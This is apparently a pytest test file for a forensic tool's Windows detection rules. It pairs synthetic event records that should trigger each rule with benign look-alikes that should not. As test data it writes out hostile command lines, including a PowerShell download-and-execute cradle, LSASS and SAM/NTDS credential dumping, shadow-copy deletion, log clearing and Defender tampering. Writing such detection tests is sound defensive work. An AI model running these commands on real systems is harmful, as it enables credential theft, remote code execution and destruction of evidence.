"""Windows behaviour rules: each fires on the behaviour and not on a near look-alike."""

from __future__ import annotations

import pytest

from auto_forensics.models import ArtifactEvent
from auto_forensics.windows_rules import RULES, WindowsRuleDetector, rule_matches

SHA = "a" * 64
SYSMON = "Microsoft-Windows-Sysmon"
RULE = {rule.rule_id: rule for rule in RULES}


def ev(event_id: int, provider: str = SYSMON, row: int = 1, **fields: str) -> ArtifactEvent:
    meta = {"event_id": event_id, "provider": provider, "channel": "", "source_file": "x.evtx",
            "source_sha256": SHA, "row": row}
    meta.update(fields)
    return ArtifactEvent(artifact_id=f"e{row}", timestamp=None, event_type=f"windows_event_{event_id}",
                         description="", source="x.evtx", metadata=meta)


HITS = [
    ("ps-encoded", ev(1, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                      CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi")),
    ("ps-download", ev(4688, "Microsoft-Windows-Security-Auditing", NewProcessName=r"C:\x\powershell.exe",
                       CommandLine="powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')")),
    ("script-from-office", ev(1, ParentImage=r"C:\Program Files\Microsoft Office\WINWORD.EXE",
                              Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami")),
    ("lolbin-proxy", ev(1, Image=r"C:\Windows\System32\regsvr32.exe",
                        CommandLine="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll")),
    ("wmi-spawn", ev(1, ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\upd")),
    ("registry-ifeo", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution "
                                          r"Options\sethc.exe\Debugger")),
    ("uac-bypass-registry", ev(13, TargetObject=r"HKU\S-1\Software\Classes\ms-settings\shell\open\command\(Default)")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\procdump64.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x1fffff")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\Desktop\mimikatz.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x00001010")),
    ("lsass-handle", ev(4656, "Microsoft-Windows-Security-Auditing", ObjectName=r"\Device\HarddiskVolume1\Windows\System32\lsass.exe",
                        AccessMask="0x001f3fff", ProcessName=r"C:\Windows\System32\cscript.exe")),
    ("lsass-writes-file", ev(11, Image=r"C:\Windows\system32\lsass.exe", TargetFilename=r"C:\Windows\System32\mimilsa.log")),
    ("process-memory-read", ev(10, SourceImage=r"C:\Users\b\AppData\Local\Temp\x\helper.exe",
                               TargetImage=r"C:\Program Files\App\App.exe", GrantedAccess="0x0000147a")),
    ("lsass-access", ev(10, SourceImage=r"c:\python27\python.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x00101ffb")),
    ("uac-com-shell", ev(1, ParentImage=r"C:\Windows\System32\dllhost.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("autoelevate-from-user-folder", ev(1, ParentImage=r"C:\Users\a\Desktop\tool.exe",
                                        Image=r"C:\Windows\System32\eventvwr.exe")),
    ("autoelevate-dll-hijack", ev(7, Image=r"C:\Windows\System32\mmc.exe",
                                  ImageLoaded=r"C:\Users\a\AppData\Local\Temp\pe386.dll")),
    ("dll-sideload", ev(7, Image=r"C:\Windows\System32\wuauclt.exe", ImageLoaded=r"C:\Users\Public\x.dll")),
    ("uac-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                        Details="DWORD (0x00000000)")),
    ("ps-logging-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
                                                r"\ScriptBlockLogging\EnableScriptBlockLogging", Details="DWORD (0x00000000)")),
    ("ps-logging-disabled", ev(12, TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment"
                                                r"\__PSLockdownPolicy")),
    ("port-proxy", ev(13, TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\1.2.3.4/8001")),
    ("rid-hijack", ev(13, Image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                      TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F")),
    ("hidden-account", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\hideme0007$\(Default)")),
    ("lolbin-proxy", ev(1, CommandLine=r'"C:\Windows\System32\rundll32.exe" zipfldr.dll,RouteTheCall c:\x\calc.exe')),
    ("lolbin-proxy", ev(1, CommandLine="desktopimgdownldr.exe /lockscreenurl:https://x/a.7z /eventName:x")),
    ("lolbin-proxy", ev(1, CommandLine=r'"c:\windows\system32\wscript.exe" /E:vbs c:\windows\temp\icon.ico')),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Program Files\Internet Explorer\iexplore.exe",
                            Image=r"C:\Windows\System32\cmd.exe")),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Program Files\MSSQL\Binn\sqlservr.exe",
                            Image=r"C:\Windows\System32\cmd.exe")),
    ("pipe-impersonation", ev(17, PipeName=r"\RoguePotato\pipe\epmapper")),
    ("getsystem-pipe", ev(1, CommandLine=r"cmd.exe /c echo msdhch > \\.\pipe\msdhch")),
    ("mssql-xp-cmdshell", ev(15457, "MSSQLSERVER", Data="xp_cmdshell | 0 | 1")),
    ("winrm-shell", ev(91, "Microsoft-Windows-WinRM")),
    ("lsass-dump-cmd", ev(1, CommandLine=r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full")),
    ("hive-dump", ev(1, CommandLine=r"reg save HKLM\SAM C:\temp\sam.save")),
    ("ntds-dump", ev(1, CommandLine='ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q')),
    ("dcsync", ev(4662, "Microsoft-Windows-Security-Auditing", SubjectUserName="mallory",
                  Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x17", ServiceName="sqlsvc")),
    ("service-install-suspicious", ev(7045, "Service Control Manager",
                                      ImagePath=r"%COMSPEC% /C echo whoami > \\127.0.0.1\C$\x.txt")),
    ("psexec-pipe", ev(17, PipeName=r"\PSEXESVC")),
    ("pth-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="9", LogonProcessName="seclogo")),
    ("admin-share-write", ev(5145, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\ADMIN$",
                             RelativeTargetName="PSEXESVC.exe")),
    ("log-cleared-cmd", ev(1, CommandLine="wevtutil cl Security")),
    ("shadow-delete", ev(1, CommandLine="vssadmin.exe delete shadows /all /quiet")),
    ("av-tamper", ev(1, CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true")),
    ("domain-discovery", ev(1, CommandLine="net group \"domain admins\" /domain")),
    ("lolbin-network", ev(3, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="93.184.216.34",
                          DestinationPort="443")),
    ("psh-scriptblock", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="Invoke-Mimikatz -DumpCreds")),
    ("wmi-subscription", ev(20)),
    ("masquerade-renamed", ev(1, Image=r"C:\Users\a\svch0st.exe", OriginalFileName="psexec.exe")),
    ("rdp-tunnel", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="10", IpAddress="127.0.0.1")),
    ("startup-file", ev(11, TargetFilename=r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
                                           r"\Startup\evil.lnk")),
    ("credential-dump-file", ev(11, TargetFilename=r"C:\Windows\Temp\lsass.dmp")),
]

MISSES = [
    # same field, ordinary value
    ("ps-encoded", ev(1, Image=r"C:\x\powershell.exe", CommandLine="powershell.exe -File C:\\scripts\\backup.ps1")),
    ("script-from-office", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("registry-autorun", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\x")),
    ("lsass-access", ev(10, SourceImage=r"C:\Windows\System32\svchost.exe", TargetImage=r"C:\Windows\lsass.exe",
                        GrantedAccess="0x1fffff")),
    ("lsass-access", ev(10, SourceImage=r"C:\a\x.exe", TargetImage=r"C:\Windows\lsass.exe", GrantedAccess="0x1000")),
    ("lsass-handle", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"\Windows\System32\lsass.exe",
                        AccessMask="0x00000004", ProcessName=r"C:\x\tool.exe")),
    ("process-memory-read", ev(10, SourceImage=r"C:\Users\b\AppData\Local\Temp\x.exe",
                               TargetImage=r"C:\Program Files\App\App.exe", GrantedAccess="0x00001000")),
    ("dcsync", ev(4662, "Microsoft-Windows-Security-Auditing", SubjectUserName="DC01$",
                  Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x12", ServiceName="sqlsvc")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x17", ServiceName="DC01$")),
    ("pth-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="2", LogonProcessName="User32")),
    ("uac-com-shell", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("lolbin-proxy", ev(1, CommandLine=r'"c:\windows\system32\wscript.exe" /E:vbs c:\scripts\logon.vbs')),
    ("lolbin-proxy", ev(1, CommandLine=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl")),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("pipe-impersonation", ev(17, PipeName=r"\spoolss")),
    ("mssql-xp-cmdshell", ev(15457, "MSSQLSERVER", Data="max server memory | 2048 | 4096")),
    ("uac-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                        Details="DWORD (0x00000001)")),
    ("ps-logging-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
                                                r"\ScriptBlockLogging\EnableScriptBlockLogging", Details="DWORD (0x00000001)")),
    ("rid-hijack", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                      TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F")),
    ("hidden-account", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\bob\(Default)")),
    ("autoelevate-from-user-folder", ev(1, ParentImage=r"C:\Windows\explorer.exe",
                                        Image=r"C:\Windows\System32\eventvwr.exe")),
    ("dll-sideload", ev(7, Image=r"C:\Windows\System32\svchost.exe",
                        ImageLoaded=r"C:\Windows\System32\kernel32.dll")),
    ("lolbin-network", ev(3, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="10.0.0.5", DestinationPort="443")),
    # Sysmon-only rules must not fire on another provider's event with the same ID
    ("registry-autorun", ev(13, "Some-Other-Provider", TargetObject=r"\CurrentVersion\Run\x")),
    ("wmi-subscription", ev(20, "Microsoft-Windows-Kernel-Power")),
    ("masquerade-renamed", ev(1, Image=r"C:\Windows\System32\cmd.exe", OriginalFileName="Cmd.Exe")),
    ("rdp-tunnel", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="5", IpAddress="127.0.0.1")),
]


@pytest.mark.parametrize("rule_id,event", HITS, ids=[h[0] for h in HITS])
def test_rule_fires(rule_id: str, event: ArtifactEvent) -> None:
    assert rule_matches(RULE[rule_id], event)


@pytest.mark.parametrize("rule_id,event", MISSES, ids=[f"not-{m[0]}" for m in MISSES])
def test_rule_ignores_look_alike(rule_id: str, event: ArtifactEvent) -> None:
    assert not rule_matches(RULE[rule_id], event)


def test_rule_ids_are_unique() -> None:
    assert len(RULE) == len(RULES)


def test_detector_reports_one_finding_per_rule_per_file_with_citation() -> None:
    events = [ev(1, row=i, CommandLine="vssadmin delete shadows /all") for i in range(1, 6)]
    findings = WindowsRuleDetector().detect(events, [], [])
    assert len(findings) == 1
    finding = findings[0]
    assert finding.citations[0].row == 1 and finding.citations[0].sha256 == SHA
    assert "4 more matching" in finding.recommendation
    assert all(item.split("=", 1)[0] in {"source", "artifact_id", "event_type"} for item in finding.evidence)


def test_event_without_citation_is_skipped() -> None:
    event = ev(1, CommandLine="vssadmin delete shadows /all")
    event.metadata.pop("source_sha256")
    assert WindowsRuleDetector().detect([event], [], []) == []


def test_parser_keeps_unnamed_data_and_userdata() -> None:
    from auto_forensics.artifacts import parse_evtx_xml_record

    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    sql = (f'<Event xmlns="{ns}"><System><Provider Name="MSSQLSERVER"/><EventID>15457</EventID></System>'
           "<EventData><Data>xp_cmdshell</Data><Data>0</Data><Data>1</Data></EventData></Event>")
    rdp = (f'<Event xmlns="{ns}"><System><Provider Name="TerminalServices"/><EventID>1149</EventID></System>'
           '<UserData><EventXML xmlns="Event_NS"><Param1>bob</Param1><Param3>127.0.0.1</Param3></EventXML>'
           "</UserData></Event>")
    first = parse_evtx_xml_record(sql, "a.evtx")
    second = parse_evtx_xml_record(rdp, "b.evtx")
    assert first is not None and first.metadata["Data"] == "xp_cmdshell | 0 | 1"
    assert second is not None and second.metadata["Param1"] == "bob" and second.metadata["Param3"] == "127.0.0.1"
